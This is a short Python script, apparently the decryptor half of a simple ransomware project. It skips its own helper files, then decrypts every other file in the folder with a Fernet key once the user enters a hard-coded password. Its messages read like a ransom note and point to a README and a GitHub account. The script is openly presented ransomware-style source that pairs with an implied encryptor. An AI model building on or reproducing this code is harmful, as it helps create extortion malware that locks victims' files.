#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

message1 = "You're file have been unlocked!!"
message2 = "WOOPS!! Wrong password!! Please read README.txt or goto https:github.com/Network1013"

# Let's list some of the files

files = []

for file in os.listdir():
	if file == "main.py" or  file == "unlocker.py" or file == "thekey.key" or file == "README.txt":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


# Using the key to decrypt the files

with open("thekey.key", "rb") as key:
	secretkey = key.read()


# Password to decrypt the files

password = "C83eCV@"


user_phrase = input("Enter the password to unlock your files!!\n")

if user_phrase == password:
# Time to decrypt some files!!
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print(message1)
else:
	print(message2)
